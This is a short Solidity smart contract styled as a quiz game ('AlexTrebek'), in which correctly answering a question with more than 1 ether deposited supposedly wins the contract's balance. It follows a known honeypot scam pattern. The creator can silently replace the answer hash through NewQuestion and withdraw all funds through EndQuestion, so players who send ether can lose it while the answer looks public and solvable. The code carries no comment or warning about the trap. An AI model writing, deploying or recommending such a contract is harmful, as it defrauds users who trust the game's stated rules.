1 pragma solidity ^0.4.24;
2 
3 contract AlexTrebek
4 {
5     bytes32 responseHash;
6     string public Jeopardy;
7     address questionSender;
8 
9     function Answer(string response)
10     public payable {
11         if (responseHash == keccak256(response) && msg.value > 1 ether) {
12             msg.sender.transfer(address(this).balance);
13         }
14     }
15  
16     function QuestionIs(string question, string response)
17     public payable {
18         if (responseHash == 0x0) {
19             responseHash = keccak256(response);
20             Jeopardy = question;
21             questionSender = msg.sender;
22         }
23     }
24 
25     function EndQuestion()
26     public payable {
27         if (msg.sender == questionSender) {
28             msg.sender.transfer(address(this).balance);
29         }
30     }
31 
32     function NewQuestion(string question, bytes32 _responseHash)
33     public payable {
34         if (msg.sender == questionSender) {
35             Jeopardy = question;
36             responseHash = _responseHash;
37         }
38     }
39     
40     function () payable public {}
41 }